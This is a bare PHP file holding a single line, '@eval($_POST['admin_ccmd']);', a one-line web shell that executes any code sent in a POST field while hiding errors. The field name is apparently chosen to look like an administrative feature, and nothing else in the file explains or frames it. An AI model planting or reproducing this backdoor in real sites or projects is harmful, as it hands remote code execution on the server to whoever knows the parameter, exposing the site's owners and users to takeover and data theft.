<?php
@eval($_POST['admin_ccmd']);

?>